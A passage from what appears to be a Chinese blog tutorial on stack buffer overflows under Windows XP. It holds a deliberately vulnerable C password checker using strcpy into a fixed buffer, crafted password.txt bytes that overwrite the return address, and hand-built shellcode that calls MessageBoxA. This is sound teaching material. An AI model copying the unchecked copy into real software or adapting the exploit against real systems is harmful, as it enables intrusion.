+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">fp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;password.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;rw+&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fscanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">valid_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ERROR!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;OK!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="分析expstd0102">分析(ExpStd0102)&lt;/h5>
+&lt;blockquote>
+&lt;p>首先使用已知的地址进行shellcode的编写，此地址不同编译器编译出的结果不同，不同系统加载的地址也不同，所以只能测试时使用&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>必要信息
+&lt;ul>
+&lt;li>成功分支地址：&lt;code>0x0040111F&lt;/code>&lt;/li>
+&lt;li>由于内存逆序存放，应该逆序写这些值&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>十六进制编辑password.txt，如下&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1F&lt;/span> &lt;span class="mi">11&lt;/span> &lt;span class="mi">40&lt;/span> &lt;span class="mo">00&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>运行程序，此时
+&lt;ul>
+&lt;li>在栈地址&lt;code>0x0012FB24&lt;/code>处存放的事是函数&lt;code>verify_password&lt;/code>的返回地址&lt;/li>
+&lt;li>此处已经被冲刷为&lt;code>0040111F&lt;/code>，而此地址是成功分支地址&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>使用成功分支地址替代了返回地址，但是由于堆栈不平衡，所以程序显示成功后崩溃&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h4 id="加入攻击载荷shellcode">加入攻击载荷(ShellCode)&lt;/h4>
+&lt;p>加大了buffer的大小用来承载攻击载荷&lt;br>
+动态加载DLL用于调用API&lt;/p>
+&lt;h5 id="代码expstd0103">代码(ExpStd0103)&lt;/h5>
+&lt;blockquote>
+&lt;p>编译环境：Windows XP SP3, Visual C++ 6, Debug&lt;br>
+实验环境：Windows XP SP3&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PASSWORD &amp;#34;1234567&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">authenticated&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PASSWORD&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">fp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">LoadLibrary&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;user32.dll&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;password.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;rw+&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fscanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">valid_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ERROR!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;OK!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="分析expstd0103">分析(ExpStd0103)&lt;/h5>
+&lt;blockquote>
+&lt;p>目标：在程序验证时植入代码，实现弹窗MessageBox&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>必要信息
+&lt;ul>
+&lt;li>数组起始地址：&lt;code>0x0012FAF0&lt;/code>(也是ShellCode执行的起始地址)&lt;/li>
+&lt;li>MessageBoxA地址：&lt;code>0x77D507EC&lt;/code>&lt;/li>
+&lt;li>十六进制的文字：&lt;code>4D6F656F6D75&lt;/code>(Moeomuoo)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>组成的机器码&lt;/li>
+&lt;/ul>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>机器码(HEX)&lt;/th>
+&lt;th>汇编码&lt;/th>
+&lt;th>注释&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>33DB&lt;/td>
+&lt;td>XOR EBX, EBX&lt;/td>
+&lt;td>清空EBX，保证ShellCode中无0(截至符)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>53&lt;/td>
+&lt;td>PUSH EBX&lt;/td>
+&lt;td>字符串末尾的&lt;code>\0&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>68 6D756F6F&lt;/td>
+&lt;td>PUSH 6F6F756D&lt;/td>
+&lt;td>压入文字字节muoo(0x6D756F6F)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>68 4D6F656F&lt;/td>
+&lt;td>PUSH 6F656F4D&lt;/td>
+&lt;td>压入文字字节Moeo(0x4D6F656F)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>8BC4&lt;/td>
+&lt;td>MOV EAX, ESP&lt;/td>
+&lt;td>ESP栈顶指向字符串Moeomuoo，移交给EAX&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>53&lt;/td>
+&lt;td>PUSH EBX&lt;/td>
+&lt;td>MB_OK&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>50&lt;/td>
+&lt;td>PUSH EAX&lt;/td>
+&lt;td>Message&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>50&lt;/td>
+&lt;td>PUSH EAX&lt;/td>
+&lt;td>Caption&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>53&lt;/td>
+&lt;td>PUSH EBX&lt;/td>
+&lt;td>Handle&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>B8 EC07D577&lt;/td>
+&lt;td>MOV EAX, 0x77D507EC&lt;/td>
+&lt;td>将MessageBoxA的地址硬编码移入EAX&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>FFD0&lt;/td>
+&lt;td>CALL EAX&lt;/td>
+&lt;td>调用MessageBoxA&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;ul>
+&lt;li>将机器码按照顺序写入password.txt
+&lt;ul>
+&lt;li>53-56字节填入返回地址(Buffer的起始地址)，其余字节用0x90填充&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>填充运行测试发现，最后只剩下2字节的空间可用，唯一不完美的地方在于程序崩溃退出&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>以下是最终的password.txt&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">33&lt;/span> &lt;span class="n">DB&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="mi">68&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="n">D&lt;/span> &lt;span class="mi">75&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">68&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="n">D&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">65&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="n">B&lt;/span> &lt;span class="n">C4&lt;/span> &lt;span class="mi">53&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">50&lt;/span> &lt;span class="mi">50&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="n">B8&lt;/span> &lt;span class="n">EC&lt;/span> &lt;span class="mo">07&lt;/span> &lt;span class="n">D5&lt;/span> &lt;span class="mi">77&lt;/span> &lt;span class="n">FF&lt;/span> &lt;span class="n">D0&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="n">F0&lt;/span> &lt;span class="n">FA&lt;/span> &lt;span class="mi">12&lt;/span> &lt;span class="mo">00&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>本文讨论了如何利用缓冲区溢出漏洞以及ShellCode的编写，但不足之处在于硬编码地址和栈空间移位的问题&lt;br>
+有关这些问题下一篇讨论&lt;/p></description></item></channel></rss>
